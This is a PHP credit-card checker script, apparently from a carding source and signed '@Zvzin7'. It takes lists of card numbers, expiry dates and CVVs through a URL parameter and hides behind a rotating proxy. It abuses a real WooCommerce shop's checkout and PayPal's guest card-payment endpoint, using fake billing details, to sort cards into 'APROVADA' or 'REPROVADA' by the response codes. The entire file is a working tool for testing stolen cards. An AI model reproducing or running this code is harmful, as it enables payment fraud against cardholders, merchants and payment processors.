<?php
date_default_timezone_set("Etc/GMT-8");
$hora = date("Y-m-d H:i:s");;

$proxy = "p.webshare.io:80"; //ip:porta
$userpass = "proxyabc1212-rotate:proxyabc"; //usuario:senha
$tipo = "HTTP"; //SOCKS5,HTTP ...
//============== funções ====
$cookie = __DIR__ . '/cookie.txt';
file_put_contents($cookie, '');

function getStr($string, $start, $end) {
    $p1 = strpos($string, $start);
    if ($p1 === false) return null;
    $p1 += strlen($start);
    $p2 = strpos($string, $end, $p1);
    if ($p2 === false) return null;
    return substr($string, $p1, $p2 - $p1);
}

$lista = $_GET['lista'] ?? die("❌ Lista não fornecida");
$dados = explode('|', $lista);
if (count($dados) < 4) die("❌ Formato: cc|mes|ano|cvv");

$cc  = trim($dados[0]);
$mes = trim($dados[1]);
$ano = trim($dados[2]);
$cvv = trim($dados[3]);

$email = "Zvzin7" . rand(1000, 9999) . "@gmail.com";

$retornolive = [
    "EXISTING_ACCOUNT_RESTRICTED",
    "INVALID_BILLING_ADDRESS",
    "INVALID_SECURITY_CODE",
    "SUCCESS",
    "RISK_DISALLOWED",
    "is3DSecureRequired"
];

//============ curlopts globais ====

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($curl, CURLOPT_MAXREDIRS, 10);
curl_setopt($curl, CURLOPT_TIMEOUT, 30);
curl_setopt($curl, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);
curl_setopt($curl, CURLOPT_PROXY, $proxy);
curl_setopt($curl, CURLOPT_PROXYUSERPWD, $userpass);
curl_setopt($curl, CURLOPT_PROXYTYPE, constant("CURLPROXY_" . strtoupper($tipo)));
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_USERAGENT, 'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Mobile Safari/537.36');
curl_setopt($curl, CURLOPT_ENCODING, '');
curl_setopt($curl, CURLOPT_COOKIEJAR, $cookie);
curl_setopt($curl, CURLOPT_COOKIEFILE, $cookie);

curl_setopt_array($curl, [
  CURLOPT_URL => 'https://zlily.com/wp-admin/admin-ajax.php',
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => 'attribute_color=Pink with white polka dots&attribute_size=XXS&quantity=1&add-to-cart=13794754&product_id=13794754&variation_id=13794755&action=woodmart_ajax_add_to_cart',
]);

$addcart = curl_exec($curl);

curl_setopt_array($curl, [
  CURLOPT_URL => 'https://zlily.com/checkout/',
  CURLOPT_CUSTOMREQUEST => 'GET',
]);

$checkout = curl_exec($curl);
$nonce = getStr($checkout, 'create-order","nonce":"', '"');
$nonce2 = getStr($checkout, 'woocommerce-process-checkout-nonce" value="', '"');


curl_setopt_array($curl, [
  CURLOPT_URL => 'https://zlily.com?wc-ajax=ppc-create-order',
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => '{"nonce":"'.$nonce.'","payer":null,"bn_code":"Woo_PPCP","context":"checkout","order_id":"0","payment_method":"ppcp-gateway","funding_source":"card","form_encoded":"wc_order_attribution_source_type=typein&wc_order_attribution_referrer=%28none%29&wc_order_attribution_utm_campaign=%28none%29&wc_order_attribution_utm_source=%28direct%29&wc_order_attribution_utm_medium=%28none%29&wc_order_attribution_utm_content=%28none%29&wc_order_attribution_utm_id=%28none%29&wc_order_attribution_utm_term=%28none%29&wc_order_attribution_utm_source_platform=%28none%29&wc_order_attribution_utm_creative_format=%28none%29&wc_order_attribution_utm_marketing_tactic=%28none%29&wc_order_attribution_session_entry=https%3A%2F%2Fzlily.com%2F&wc_order_attribution_session_start_time=2026-01-27+02%3A43%3A31&wc_order_attribution_session_pages=8&wc_order_attribution_session_count=1&wc_order_attribution_user_agent=Mozilla%2F5.0+%28Linux%3B+Android+10%3B+K%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F143.0.0.0+Mobile+Safari%2F537.36&billing_first_name=Zvzin7&billing_last_name=Zvzin7&billing_company=&billing_country=US&billing_address_1=Zvzin7&billing_address_2=&billing_city=Zvzin7&billing_state=NY&billing_postcode=10080&billing_phone=2074075634&billing_email=Zvzin7%40gmail.com&account_username=&account_password=&shipping_first_name=&shipping_last_name=&shipping_company=&shipping_country=US&shipping_address_1=&shipping_address_2=&shipping_city=&shipping_state=&shipping_postcode=&shipping_phone=&order_comments=&cart%5B1cc046e85c6385a01dae7f6f63670c1b%5D%5Bqty%5D=1&_wpnonce=ea73a42f11&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&shipping_method%5B0%5D=free_shipping%3A1&payment_method=ppcp-gateway&woocommerce-process-checkout-nonce='.$nonce2.'&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&ppcp-funding-source=card","createaccount":false,"save_payment_method":false}',  
  CURLOPT_HTTPHEADER => [
    'Content-Type: application/json',
    'origin: https://zlily.com',
    'referer: https://zlily.com/checkout/',
  ],
]);

$pegartokens = curl_exec($curl);
$token1 = getStr($pegartokens, '"id":"', '"');

curl_setopt_array($curl, [
  CURLOPT_URL => 'https://www.paypal.com/graphql?fetch_credit_form_submit=',
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => '{"query":"\\n        mutation payWithCard(\\n            $token: String!\\n            $card: CardInput\\n            $paymentToken: String\\n            $phoneNumber: String\\n            $firstName: String\\n            $lastName: String\\n            $shippingAddress: AddressInput\\n            $billingAddress: AddressInput\\n            $email: String\\n            $currencyConversionType: CheckoutCurrencyConversionType\\n            $installmentTerm: Int\\n            $identityDocument: IdentityDocumentInput\\n            $feeReferenceId: String\\n        ) {\\n            approveGuestPaymentWithCreditCard(\\n                token: $token\\n                card: $card\\n                paymentToken: $paymentToken\\n                phoneNumber: $phoneNumber\\n                firstName: $firstName\\n                lastName: $lastName\\n                email: $email\\n                shippingAddress: $shippingAddress\\n                billingAddress: $billingAddress\\n                currencyConversionType: $currencyConversionType\\n                installmentTerm: $installmentTerm\\n                identityDocument: $identityDocument\\n                feeReferenceId: $feeReferenceId\\n            ) {\\n                flags {\\n                    is3DSecureRequired\\n                }\\n                cart {\\n                    intent\\n                    cartId\\n                    buyer {\\n                        userId\\n                        auth {\\n                            accessToken\\n                        }\\n                    }\\n                    returnUrl {\\n                        href\\n                    }\\n                }\\n                paymentContingencies {\\n                    threeDomainSecure {\\n                        status\\n                        method\\n                        redirectUrl {\\n                            href\\n                        }\\n                        parameter\\n                    }\\n                }\\n            }\\n        }\\n        ","variables":{"token":"'.$token1.'","card":{"cardNumber":"'.$cc.'","type":"VISA","expirationDate":"'.$mes.'/'.$ano.'","postalCode":"10080","securityCode":"'.$cvv.'"},"firstName":"Zvzin","lastName":"Zvzin","billingAddress":{"givenName":"Zvzin","familyName":"Zvzin","line1":"Zvzin7","line2":null,"city":"Zvzin7","state":"NY","postalCode":"10080","country":"US"},"email":"Zvzin7@gmail.com","currencyConversionType":"PAYPAL"},"operationName":null}',
  CURLOPT_HTTPHEADER => [
    'Content-Type: application/json',
    'paypal-client-context: '.$token1,
    'x-app-name: standardcardfields',
    'paypal-client-metadata-id: '.$token1,
    'x-country: US',
    'origin: https://www.paypal.com',
    'referer: https://www.paypal.com/smart/card-fields?token='.$token1.'W&sessionID=uid_9f6898dca2_mdi6ndq6mje&buttonSessionID=uid_c036425466_mdi6ntg6mdg&locale.x=pt_BR&commit=true&style.submitButton.display=true&hasShippingCallback=false&env=production&country.x=BR&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QkFBSWM2cnpoNF9OYmdOZnBoaUpVODFYYU01RVJMSGItSDZFa3lReGdZQWd2RXVBQjhnY3ZBSFN4anVDczYxSWRNbVpra0dKQUJuSlh2NzVKdyZjdXJyZW5jeT1CUkwmaW50ZWdyYXRpb24tZGF0ZT0yMDI2LTAxLTA1JmNvbXBvbmVudHM9YnV0dG9ucyxmdW5kaW5nLWVsaWdpYmlsaXR5JnZhdWx0PWZhbHNlJmNvbW1pdD10cnVlJmludGVudD1jYXB0dXJlJmRlYnVnPXRydWUmZW5hYmxlLWZ1bmRpbmc9dmVubW8scGF5bGF0ZXIiLCJhdHRycyI6eyJkYXRhLXBhcnRuZXItYXR0cmlidXRpb24taWQiOiJXb29fUFBDUCIsImRhdGEtdWlkIjoidWlkX2N3bnJlaXNjaHR2ZHhuaGJjb2p4dGZ2bnZ4b2tueiJ9fQ&disable-card=',
  ],
]);

$result = curl_exec($curl);

$retorno = getStr($result, 'code":"', '"');

// Análise da resposta
if (in_array($retorno, $retornolive, true)) {
    echo "✅ APROVADA - {$cc}|{$mes}|{$ano}|{$cvv}<br> 
{$retorno}<br>
by @Zvzin7";
} 
else {
    echo "❌ REPROVADA - {$cc}|{$mes}|{$ano}|{$cvv}<br>
{$retorno}<br>
by @Zvzin7";
}


?>